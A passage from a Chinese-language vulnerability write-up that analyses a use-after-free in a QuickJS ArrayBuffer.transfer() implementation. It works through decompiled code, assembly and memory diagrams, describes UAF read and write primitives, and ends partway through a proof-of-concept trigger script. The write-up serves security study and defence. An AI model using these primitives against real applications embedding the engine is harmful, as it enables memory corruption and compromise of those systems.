        <span class="hljs-keyword">if</span> (JS_ToIndex(ctx, &amp;new_len, *argv))
            <span class="hljs-keyword">goto</span> ERROR_RETURN;
    } <span class="hljs-keyword">else</span> {
        new_len = v13-&gt;byte_length;  <span class="hljs-comment">// 默认使用原长度</span>
    }
    
    <span class="hljs-comment">// 4. 检查原ArrayBuffer是否已经detached</span>
    <span class="hljs-keyword">if</span> (v13-&gt;detached)
        <span class="hljs-keyword">return</span> JS_ThrowTypeError(ctx, <span class="hljs-string">"ArrayBuffer is detached"</span>);
</code></pre>
<p>这里处理了<code>transfer()</code>的可选参数——新ArrayBuffer的大小。如果不指定，默认使用原大小。</p>
<pre><code class="hljs language-c" lang="c">    <span class="hljs-comment">// 5. 处理可调整大小的ArrayBuffer</span>
    <span class="hljs-keyword">if</span> (!transfer_to_fixed_length) {
        max_byte_length = v13-&gt;max_byte_length;
        <span class="hljs-keyword">if</span> ((max_byte_length &amp; <span class="hljs-number">0x80000000</span>) == <span class="hljs-number">0</span>) {
            max_len[<span class="hljs-number">0</span>] = v13-&gt;max_byte_length;
            <span class="hljs-keyword">if</span> (max_byte_length &lt; new_len)
                <span class="hljs-keyword">return</span> JS_ThrowTypeError(ctx, <span class="hljs-string">"invalid array buffer length"</span>);
            <span class="hljs-keyword">if</span> (v13-&gt;free_func == js_array_buffer_free)
                v16 = max_len;
        }
    }
</code></pre>
<p>这部分处理可调整大小（resizable）ArrayBuffer的情况，检查新长度是否超过<code>maxByteLength</code>。</p>
<h4 data-id="heading-13">关键漏洞代码</h4>
<p>接下来是核心的数据转移逻辑，也是<strong>漏洞所在</strong>：</p>
<pre><code class="hljs language-c" lang="c">    <span class="hljs-comment">// 6. 如果新长度不为0，需要复制或重分配数据</span>
    <span class="hljs-keyword">if</span> (new_len) {
        data = v13-&gt;data;
        free_func = v13-&gt;free_func;
        byte_length = v13-&gt;byte_length;
        
        <span class="hljs-comment">// 情况1: 长度不变，直接使用原数据</span>
        <span class="hljs-keyword">if</span> (byte_length == new_len) {
            v23 = v13-&gt;data;
            <span class="hljs-keyword">goto</span> DETACH_AND_RETURN;
        }
        
        <span class="hljs-comment">// 情况2: 长度改变，需要realloc或memcpy</span>
        <span class="hljs-keyword">if</span> (new_len &lt;= <span class="hljs-number">0x7FFFFFFF</span>) {
            <span class="hljs-comment">// 如果使用默认的free函数，尝试realloc</span>
            <span class="hljs-keyword">if</span> (free_func == js_array_buffer_free) {
                v26 = (<span class="hljs-type">uint8_t</span> *)js_realloc(ctx, v13-&gt;data, new_len);
                v23 = v26;
                <span class="hljs-keyword">if</span> (v26) {
                    <span class="hljs-comment">// 如果扩大了，需要将新增部分清零</span>
                    <span class="hljs-keyword">if</span> (v13-&gt;byte_length &lt; new_len) {
                        <span class="hljs-built_in">memset</span>(&amp;v26[v13-&gt;byte_length], <span class="hljs-number">0</span>, 
                               new_len - v13-&gt;byte_length);
                    }
                    <span class="hljs-keyword">goto</span> DETACH_AND_RETURN;
                }
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// 如果使用自定义free函数，需要重新分配并复制</span>
                v21 = (<span class="hljs-type">uint8_t</span> *)js_mallocz_rt(ctx-&gt;rt, new_len);
                <span class="hljs-keyword">if</span> (v21) {
                    <span class="hljs-type">int</span> copy_size = (byte_length &lt;= new_len) ? 
                                    byte_length : new_len;
                    <span class="hljs-built_in">memcpy</span>(v21, data, copy_size);
                    v13-&gt;free_func(ctx-&gt;rt, v13-&gt;opaque, data);
                    v23 = v21;
                    free_func = js_array_buffer_free;
                    <span class="hljs-keyword">goto</span> DETACH_AND_RETURN;
                }
            }
            <span class="hljs-keyword">goto</span> ERROR_RETURN;
        }
        <span class="hljs-keyword">return</span> JS_ThrowRangeError(ctx, <span class="hljs-string">"invalid array buffer length"</span>);
        
DETACH_AND_RETURN:
        <span class="hljs-comment">// ⚠️⚠️⚠️ 漏洞核心：只标记ArrayBuffer为detached ⚠️⚠️⚠️</span>
        v13-&gt;detached = <span class="hljs-number">1</span>;       <span class="hljs-comment">// 设置detached标志</span>
        v13-&gt;data = <span class="hljs-number">0</span>;           <span class="hljs-comment">// 清空data指针</span>
        v13-&gt;byte_length = <span class="hljs-number">0</span>;    <span class="hljs-comment">// 清空byte_length</span>
        
        <span class="hljs-comment">// ❌ 关键问题：没有遍历array_list更新TypedArray视图！</span>
        <span class="hljs-comment">// ❌ 没有调用任何函数来同步视图状态！</span>
        
        <span class="hljs-comment">// 创建并返回新的ArrayBuffer</span>
        <span class="hljs-keyword">return</span> js_array_buffer_constructor3(
            ctx, (JSValue)__PAIR128__(<span class="hljs-number">3</span>, <span class="hljs-number">0</span>), 
            new_len, v16, <span class="hljs-number">0x13</span>u, v23, free_func, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
    }
</code></pre>
<p><strong>这就是漏洞的本质</strong>：在<code>DETACH_AND_RETURN</code>标签处，代码只做了三件事：</p>
<ol>
<li>设置<code>v13-&gt;detached = 1</code></li>
<li>清空<code>v13-&gt;data = 0</code></li>
<li>清空<code>v13-&gt;byte_length = 0</code></li>
</ol>
<p>但是，<strong>完全没有处理<code>v13-&gt;array_list</code>中链接的所有TypedArray视图</strong>！这导致：</p>
<ul>
<li>ArrayBuffer对象自己知道已经detached了</li>
<li>但是所有基于它创建的TypedArray视图还保留着旧的<code>length</code>和<code>data</code>指针</li>
<li>这些TypedArray的内部状态指向的是已经被转移的内存区域</li>
</ul>
<pre><code class="hljs language-c" lang="c">    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 7. 如果新长度为0，调用JS_DetachArrayBuffer正确处理</span>
        JS_DetachArrayBuffer(ctx, 
            (JSValue)__PAIR128__(tag, (<span class="hljs-type">unsigned</span> __int64)this_val.u.ptr));
        <span class="hljs-keyword">return</span> js_array_buffer_constructor3(
            ctx, (JSValue)__PAIR128__(<span class="hljs-number">3</span>, <span class="hljs-number">0</span>), 
            <span class="hljs-number">0</span>, v16, <span class="hljs-number">0x13</span>u, <span class="hljs-number">0</span>, js_array_buffer_free, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);
    }
</code></pre>
<p>有意思的是，当<code>new_len == 0</code>时，代码<strong>正确地调用了<code>JS_DetachArrayBuffer</code></strong>！这说明开发者知道存在这个函数，却在主要路径上没有使用它。</p>
<h4 data-id="heading-14">正确实现：JS_DetachArrayBuffer分析</h4>
<p>让我们看看正确的detach实现是什么样的：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-type">void</span> <span class="hljs-title function_">JS_DetachArrayBuffer</span><span class="hljs-params">(JSContext *ctx, JSValue obj)</span>
{
    JSArrayBuffer *abuf = JS_GetOpaque(obj, JS_CLASS_ARRAY_BUFFER);
    
    <span class="hljs-keyword">if</span> (!abuf || abuf-&gt;detached)
        <span class="hljs-keyword">return</span>;
    
    <span class="hljs-comment">// ✅ 关键步骤：遍历array_list中的所有TypedArray视图</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> *<span class="hljs-title">el</span>, *<span class="hljs-title">el1</span>;</span>
    list_for_each_safe(el, el1, &amp;abuf-&gt;array_list) {
        JSTypedArray *ta = list_entry(el, JSTypedArray, link);
        JSObject *view = ta-&gt;obj;
        
        <span class="hljs-comment">// ✅ 更新每个视图的状态</span>
        <span class="hljs-keyword">if</span> (view-&gt;class_id != JS_CLASS_DATAVIEW) {
            <span class="hljs-comment">// 对于TypedArray，清空length和data指针</span>
            view-&gt;u.typed_array.length = <span class="hljs-number">0</span>;
            view-&gt;u.typed_array.data = <span class="hljs-literal">NULL</span>;
        }
        <span class="hljs-comment">// DataView的处理略有不同，但也会失效</span>
    }
    
    <span class="hljs-comment">// ✅ 所有视图都更新完毕后，才标记ArrayBuffer为detached</span>
    abuf-&gt;detached = <span class="hljs-number">1</span>;
    abuf-&gt;data = <span class="hljs-literal">NULL</span>;
    abuf-&gt;byte_length = <span class="hljs-number">0</span>;
}
</code></pre>
<p>对比两者的区别：</p>








































<table><thead><tr><th>操作</th><th>js_array_buffer_transfer</th><th>JS_DetachArrayBuffer</th></tr></thead><tbody><tr><td>设置detached标志</td><td>✅</td><td>✅</td></tr><tr><td>清空data指针</td><td>✅</td><td>✅</td></tr><tr><td>清空byte_length</td><td>✅</td><td>✅</td></tr><tr><td>遍历array_list</td><td>❌ <strong>缺失</strong></td><td>✅</td></tr><tr><td>更新TypedArray.length</td><td>❌ <strong>缺失</strong></td><td>✅</td></tr><tr><td>更新TypedArray.data</td><td>❌ <strong>缺失</strong></td><td>✅</td></tr></tbody></table>
<h4 data-id="heading-15">漏洞触发流程对比</h4>
<p><strong>正常的ArrayBuffer.resize()流程（参考对比）：</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">用户调用: buffer.resize(newSize)</span>
    ↓
<span class="hljs-section">进入: js_array_buffer_resize (地址 0x4b370)</span>
    ↓
分配/调整内存
    ↓
遍历 array_list 链表 (行 52-81)
    ↓
更新每个 TypedArray 的:
    - length 字段
    - data 指针
    - 其他相关状态
    ↓
✅ 所有视图状态与ArrayBuffer保持同步
</code></pre>
<p><strong>存在漏洞的ArrayBuffer.transfer()流程：</strong></p>
<pre><code class="hljs language-ini" lang="ini">用户调用: buffer.transfer(newSize)
    ↓
进入: js_array_buffer_transfer (地址 0xa6450)
    ↓
复制/转移数据到新内存
    ↓
标记原ArrayBuffer:
    - <span class="hljs-attr">detached</span> = <span class="hljs-number">1</span>
    - <span class="hljs-attr">data</span> = NULL
    - <span class="hljs-attr">byte_length</span> = <span class="hljs-number">0</span>
    ↓
❌ 跳过遍历 array_list 的步骤
    ↓
创建新ArrayBuffer并返回
    ↓
❌ 旧的TypedArray视图仍然保留:
    - 非零的 length
    - 指向已转移内存的 data 指针
    ↓
💣 Use-After-Free 漏洞！
</code></pre>
<h4 data-id="heading-16">汇编层面的验证</h4>
<p>在IDA中查看关键代码段（地址 0xa659b - 0xa65d5）：</p>
<pre><code class="hljs language-asm" lang="asm">; 设置detached状态
loc_A659B:
    mov     byte ptr [r8+8], 1      ; v13-&gt;detached = 1
    mov     qword ptr [r8+10h], 0   ; v13-&gt;data = NULL
    mov     dword ptr [r8], 0       ; v13-&gt;byte_length = 0
    
    ; 准备调用js_array_buffer_constructor3创建新buffer
    mov     rdi, r12                ; ctx
    mov     esi, 3                  ; tag
    xor     edx, edx                ; ptr = NULL
    mov     rcx, r13                ; new_len
    mov     r8, r14                 ; max_len
    mov     r9d, 13h                ; class_id
    mov     [rsp+90h+var_70], rbx   ; data
    mov     [rsp+90h+var_68], rbp   ; free_func
    mov     [rsp+90h+var_60], 0     ; opaque
    mov     [rsp+90h+var_58], 0     ; shared
    
    call    js_array_buffer_constructor3
    ; ↑ 注意：从设置detached到这里，没有任何对array_list的操作！
    
    jmp     loc_A66AD               ; 返回
</code></pre>
<p>可以清楚地看到，在标记detached和创建新buffer之间，<strong>没有任何循环或函数调用来处理<code>array_list</code></strong>。这段汇编代码直接印证了我们从伪代码中看到的问题。</p>
<h4 data-id="heading-17">内存状态图解</h4>
<p>让我们用图示来理解漏洞前后的内存状态变化：</p>
<p><strong>调用transfer()之前：</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">堆内存:</span>
<span class="hljs-string">┌──────────────────┐</span> <span class="hljs-number">0x555556789000</span>
<span class="hljs-string">│</span>  <span class="hljs-string">实际数据区域</span>     <span class="hljs-string">│</span>
<span class="hljs-string">│</span> [<span class="hljs-number">0xAAAA0000</span>]     <span class="hljs-string">│</span>
<span class="hljs-string">│</span> [<span class="hljs-number">0xAAAA0001</span>]     <span class="hljs-string">│</span>
<span class="hljs-string">│</span> [<span class="hljs-number">0xAAAA0002</span>]     <span class="hljs-string">│</span>
<span class="hljs-string">│</span>      <span class="hljs-string">...</span>         <span class="hljs-string">│</span>
<span class="hljs-string">└──────────────────┘</span>

<span class="hljs-string">ArrayBuffer对象</span> <span class="hljs-string">(ab1):</span>
<span class="hljs-string">┌──────────────────┐</span>
<span class="hljs-string">│</span> <span class="hljs-attr">byte_length:</span>     <span class="hljs-string">│</span> <span class="hljs-string">=</span> <span class="hljs-number">0x100</span>
<span class="hljs-string">│</span> <span class="hljs-attr">detached:</span>        <span class="hljs-string">│</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span> <span class="hljs-string">(false)</span>
<span class="hljs-string">│</span> <span class="hljs-attr">data:</span> <span class="hljs-string">───────────┼─→</span> <span class="hljs-number">0x555556789000</span>
<span class="hljs-string">│</span> <span class="hljs-attr">array_list:</span> <span class="hljs-string">─────┼─→</span> [<span class="hljs-string">TypedArray链表</span>]
<span class="hljs-string">│</span>   <span class="hljs-attr">next:</span> <span class="hljs-string">─────────┼──┐</span>
<span class="hljs-string">│</span>   <span class="hljs-attr">prev:</span> <span class="hljs-string">─────────┼──┤</span>
<span class="hljs-string">│</span> <span class="hljs-attr">free_func:</span>       <span class="hljs-string">│</span>  <span class="hljs-string">│</span>
<span class="hljs-string">└──────────────────┘</span>  <span class="hljs-string">│</span>
                      <span class="hljs-string">│</span>
<span class="hljs-string">TypedArray对象</span> <span class="hljs-string">(ta1):</span> <span class="hljs-string">│</span>
<span class="hljs-string">┌──────────────────┐</span>  <span class="hljs-string">│</span>
<span class="hljs-string">│</span> <span class="hljs-attr">link:</span> <span class="hljs-string">───────────┼──┘</span> <span class="hljs-string">(连接到ab1的array_list)</span>
<span class="hljs-string">│</span> <span class="hljs-attr">obj:</span>             <span class="hljs-string">│</span>
<span class="hljs-string">│</span> <span class="hljs-attr">buffer:</span> <span class="hljs-string">─────────┼─→</span> <span class="hljs-string">ab1</span>
<span class="hljs-string">│</span> <span class="hljs-attr">offset:</span>          <span class="hljs-string">│</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span>
<span class="hljs-string">│</span> <span class="hljs-attr">length:</span>          <span class="hljs-string">│</span> <span class="hljs-string">=</span> <span class="hljs-number">64</span> <span class="hljs-string">(0x100/4)</span>
<span class="hljs-string">└──────────────────┘</span>
  <span class="hljs-string">↓</span>
<span class="hljs-string">JSObject</span> <span class="hljs-string">(实际的Uint32Array):</span>
<span class="hljs-string">┌──────────────────┐</span>
<span class="hljs-string">│</span> <span class="hljs-attr">class_id:</span> <span class="hljs-string">───────┼─→</span> <span class="hljs-string">JS_CLASS_UINT32_ARRAY</span>
<span class="hljs-string">│</span> <span class="hljs-attr">u.typed_array:</span>   <span class="hljs-string">│</span>
<span class="hljs-string">│</span>   <span class="hljs-attr">length:</span> <span class="hljs-string">───────┼─→</span> <span class="hljs-number">64</span>
<span class="hljs-string">│</span>   <span class="hljs-attr">data:</span> <span class="hljs-string">─────────┼─→</span> <span class="hljs-number">0x555556789000</span>
<span class="hljs-string">└──────────────────┘</span>
</code></pre>
<p><strong>调用ab1.transfer()之后：</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">堆内存:</span>
<span class="hljs-string">┌──────────────────┐</span> <span class="hljs-number">0x555556ABC000</span> <span class="hljs-string">(新分配)</span>
<span class="hljs-string">│</span>  <span class="hljs-string">转移后的数据</span>     <span class="hljs-string">│</span>
<span class="hljs-string">│</span> [<span class="hljs-number">0xAAAA0000</span>]     <span class="hljs-string">│</span>
<span class="hljs-string">│</span> [<span class="hljs-number">0xAAAA0001</span>]     <span class="hljs-string">│</span>
<span class="hljs-string">│</span> [<span class="hljs-number">0xAAAA0002</span>]     <span class="hljs-string">│</span>
<span class="hljs-string">│</span>      <span class="hljs-string">...</span>         <span class="hljs-string">│</span>
<span class="hljs-string">└──────────────────┘</span>

<span class="hljs-string">┌──────────────────┐</span> <span class="hljs-number">0x555556789000</span> <span class="hljs-string">(旧地址)</span>
<span class="hljs-string">│</span>  <span class="hljs-string">可能被重用的</span>     <span class="hljs-string">│</span> <span class="hljs-string">←</span> <span class="hljs-string">⚠️</span> <span class="hljs-string">悬空指针指向这里！</span>
<span class="hljs-string">│</span>  <span class="hljs-string">内存区域</span>         <span class="hljs-string">│</span>    <span class="hljs-string">可能包含:</span>
<span class="hljs-string">│</span> [<span class="hljs-string">tcache</span> <span class="hljs-string">fd</span>]      <span class="hljs-string">│</span>    <span class="hljs-bullet">-</span> <span class="hljs-string">tcache链表指针</span>
<span class="hljs-string">│</span> [<span class="hljs-string">heap</span> <span class="hljs-string">metadata</span>]  <span class="hljs-string">│</span>    <span class="hljs-bullet">-</span> <span class="hljs-string">其他对象数据</span>
<span class="hljs-string">│</span>      <span class="hljs-string">...</span>         <span class="hljs-string">│</span>    <span class="hljs-bullet">-</span> <span class="hljs-string">libc指针</span>
<span class="hljs-string">└──────────────────┘</span>

<span class="hljs-string">原ArrayBuffer对象</span> <span class="hljs-string">(ab1):</span>
<span class="hljs-string">┌──────────────────┐</span>
<span class="hljs-string">│</span> <span class="hljs-attr">byte_length:</span>     <span class="hljs-string">│</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span> <span class="hljs-string">✅</span>
<span class="hljs-string">│</span> <span class="hljs-attr">detached:</span>        <span class="hljs-string">│</span> <span class="hljs-string">=</span> <span class="hljs-number">1</span> <span class="hljs-string">✅</span>
<span class="hljs-string">│</span> <span class="hljs-attr">data:</span>            <span class="hljs-string">│</span> <span class="hljs-string">=</span> <span class="hljs-literal">NULL</span> <span class="hljs-string">✅</span>
<span class="hljs-string">│</span> <span class="hljs-attr">array_list:</span> <span class="hljs-string">─────┼─→</span> [<span class="hljs-string">链表仍然存在</span>]
<span class="hljs-string">│</span>   <span class="hljs-attr">next:</span> <span class="hljs-string">─────────┼──┐</span>
<span class="hljs-string">│</span>   <span class="hljs-attr">prev:</span> <span class="hljs-string">─────────┼──┤</span>
<span class="hljs-string">└──────────────────┘</span>  <span class="hljs-string">│</span>
                      <span class="hljs-string">│</span>
<span class="hljs-string">原TypedArray对象</span> <span class="hljs-string">(ta1):</span> <span class="hljs-string">│</span>
<span class="hljs-string">┌──────────────────┐</span>  <span class="hljs-string">│</span>
<span class="hljs-string">│</span> <span class="hljs-attr">link:</span> <span class="hljs-string">───────────┼──┘</span> <span class="hljs-string">(仍然连接)</span>
<span class="hljs-string">│</span> <span class="hljs-attr">obj:</span>             <span class="hljs-string">│</span>
<span class="hljs-string">│</span> <span class="hljs-attr">buffer:</span> <span class="hljs-string">─────────┼─→</span> <span class="hljs-string">ab1</span> <span class="hljs-string">(已detached)</span>
<span class="hljs-string">│</span> <span class="hljs-attr">offset:</span>          <span class="hljs-string">│</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span> <span class="hljs-string">❌</span> <span class="hljs-string">未清零</span>
<span class="hljs-string">│</span> <span class="hljs-attr">length:</span>          <span class="hljs-string">│</span> <span class="hljs-string">=</span> <span class="hljs-number">64</span> <span class="hljs-string">❌</span> <span class="hljs-string">未清零！</span>
<span class="hljs-string">└──────────────────┘</span>
  <span class="hljs-string">↓</span>
<span class="hljs-string">JSObject</span> <span class="hljs-string">(ta1对应的Uint32Array):</span>
<span class="hljs-string">┌──────────────────┐</span>
<span class="hljs-string">│</span> <span class="hljs-attr">class_id:</span> <span class="hljs-string">───────┼─→</span> <span class="hljs-string">JS_CLASS_UINT32_ARRAY</span>
<span class="hljs-string">│</span> <span class="hljs-attr">u.typed_array:</span>   <span class="hljs-string">│</span>
<span class="hljs-string">│</span>   <span class="hljs-attr">length:</span> <span class="hljs-string">───────┼─→</span> <span class="hljs-number">64</span> <span class="hljs-string">❌</span> <span class="hljs-string">应该是0！</span>
<span class="hljs-string">│</span>   <span class="hljs-attr">data:</span> <span class="hljs-string">─────────┼─→</span> <span class="hljs-number">0x555556789000</span> <span class="hljs-string">❌</span> <span class="hljs-string">应该是NULL！</span>
<span class="hljs-string">└──────────────────┘</span>         <span class="hljs-string">│</span>
                             <span class="hljs-string">│</span>
                             <span class="hljs-string">└→</span> <span class="hljs-string">💣</span> <span class="hljs-string">悬空指针！指向已释放/转移的内存</span>

<span class="hljs-string">新ArrayBuffer对象</span> <span class="hljs-string">(ab2):</span>
<span class="hljs-string">┌──────────────────┐</span>
<span class="hljs-string">│</span> <span class="hljs-attr">byte_length:</span>     <span class="hljs-string">│</span> <span class="hljs-string">=</span> <span class="hljs-number">0x100</span>
<span class="hljs-string">│</span> <span class="hljs-attr">detached:</span>        <span class="hljs-string">│</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span>
<span class="hljs-string">│</span> <span class="hljs-attr">data:</span> <span class="hljs-string">───────────┼─→</span> <span class="hljs-number">0x555556ABC000</span> <span class="hljs-string">(新地址)</span>
<span class="hljs-string">│</span> <span class="hljs-attr">array_list:</span> <span class="hljs-string">─────┼─→</span> [<span class="hljs-string">空链表或新视图</span>]
<span class="hljs-string">└──────────────────┘</span>

<span class="hljs-string">新TypedArray对象</span> <span class="hljs-string">(ta2):</span>
<span class="hljs-string">┌──────────────────┐</span>
<span class="hljs-string">│</span> <span class="hljs-attr">buffer:</span> <span class="hljs-string">─────────┼─→</span> <span class="hljs-string">ab2</span>
<span class="hljs-string">│</span> <span class="hljs-attr">offset:</span>          <span class="hljs-string">│</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span>
<span class="hljs-string">│</span> <span class="hljs-attr">length:</span>          <span class="hljs-string">│</span> <span class="hljs-string">=</span> <span class="hljs-number">64</span>
<span class="hljs-string">└──────────────────┘</span>
  <span class="hljs-string">↓</span>
<span class="hljs-attr">JSObject:</span>
<span class="hljs-string">┌──────────────────┐</span>
<span class="hljs-string">│</span> <span class="hljs-attr">u.typed_array:</span>   <span class="hljs-string">│</span>
<span class="hljs-string">│</span>   <span class="hljs-attr">length:</span> <span class="hljs-string">───────┼─→</span> <span class="hljs-number">64</span>
<span class="hljs-string">│</span>   <span class="hljs-attr">data:</span> <span class="hljs-string">─────────┼─→</span> <span class="hljs-number">0x555556ABC000</span> <span class="hljs-string">✅</span> <span class="hljs-string">正确</span>
<span class="hljs-string">└──────────────────┘</span>
</code></pre>
<p>关键观察：</p>
<ol>
<li><strong>ab1被正确标记为detached</strong>（detached=1, data=NULL, byte_length=0）</li>
<li><strong>ta1的TypedArray结构体没有更新</strong>（length仍为64）</li>
<li><strong>ta1对应的JSObject.u.typed_array也没有更新</strong>（data指针仍指向0x555556789000）</li>
<li><strong>结果</strong>：通过ta1访问数组时，QuickJS不会检查底层ArrayBuffer是否detached，直接使用JSObject中保存的data指针和length，导致访问已释放/转移的内存</li>
</ol>
<h4 data-id="heading-18">UAF的具体表现</h4>
<p>这个UAF有以下特点：</p>
<ol>
<li><strong>读原语</strong>：可以通过旧TypedArray读取已转移内存区域的数据</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> value = ta1[<span class="hljs-number">0</span>]; <span class="hljs-comment">// 读取0x555556789000位置的数据</span>
</code></pre>
<ol>
<li><strong>写原语</strong>：可以通过旧TypedArray写入已转移内存区域</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript">ta1[<span class="hljs-number">0</span>] = <span class="hljs-number">0xDEADBEEF</span>; <span class="hljs-comment">// 写入0x555556789000位置</span>
</code></pre>
<ol>
<li><strong>数据重叠</strong>：如果旧内存区域被新分配的ArrayBuffer复用，会造成数据损坏</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript">ta1[<span class="hljs-number">0</span>] = <span class="hljs-number">0x12345678</span>; <span class="hljs-comment">// 写入旧地址</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ta2[<span class="hljs-number">0</span>]); <span class="hljs-comment">// 如果内存重叠，可能读到0x12345678</span>
</code></pre>
<h3 data-id="heading-19">漏洞验证实验</h3>
<p>理论分析完毕，让我们通过实际代码来验证漏洞的存在。</p>
<h4 data-id="heading-20">实验1：基础UAF验证</h4>
<p>首先编写最简单的PoC来确认漏洞触发：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// simple_uaf_verify.js - 验证UAF漏洞存在</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[*] QuickJS ArrayBuffer.transfer() UAF Vulnerability Verification"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 阶段1：创建测试对象</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Phase 1] Creating ArrayBuffer and TypedArray..."</span>);
<span class="hljs-keyword">const</span> ab1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x100</span>);
<span class="hljs-keyword">const</span> ta1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint32Array</span>(ab1);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] ArrayBuffer created: size = 0x100 bytes"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] TypedArray created: length ="</span>, ta1.<span class="hljs-property">length</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] TypedArray byteLength ="</span>, ta1.<span class="hljs-property">byteLength</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 阶段2：填充可识别的测试数据</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Phase 2] Filling with test pattern..."</span>);
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; ta1.<span class="hljs-property">length</span>; i++) {
    ta1[i] = <span class="hljs-number">0xAAAA0000</span> + i;
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Pattern: 0xAAAA0000, 0xAAAA0001, 0xAAAA0002, ..."</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] ta1[0] ="</span>, <span class="hljs-string">"0x"</span> + ta1[<span class="hljs-number">0</span>].<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">8</span>, <span class="hljs-string">"0"</span>));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] ta1[1] ="</span>, <span class="hljs-string">"0x"</span> + ta1[<span class="hljs-number">1</span>].<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">8</span>, <span class="hljs-string">"0"</span>));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] ta1[2] ="</span>, <span class="hljs-string">"0x"</span> + ta1[<span class="hljs-number">2</span>].<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">8</span>, <span class="hljs-string">"0"</span>));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 阶段3：触发漏洞</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Phase 3] Triggering vulnerability via transfer()..."</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [*] Calling ab1.transfer()..."</span>);

<span class="hljs-keyword">const</span> ab2 = ab1.<span class="hljs-title function_">transfer</span>();
<span class="hljs-keyword">const</span> ta2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint32Array</span>(ab2);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Transfer completed"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] ab1 should be detached now"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] ab1.byteLength ="</span>, ab1.<span class="hljs-property">byteLength</span>, <span class="hljs-string">"(should be 0)"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] ta2 is the new TypedArray pointing to transferred data"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 阶段4：检测UAF - 读取</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Phase 4] Testing UAF: Reading from detached TypedArray..."</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [*] Attempting to read ta1[0] (should fail but won't)..."</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> oldValue = ta1[<span class="hljs-number">0</span>];
    
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"\x1b[1;31m"</span> + <span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>));
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [!!! UAF VULNERABILITY CONFIRMED !!!]"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>) + <span class="hljs-string">"\x1b[0m"</span>);
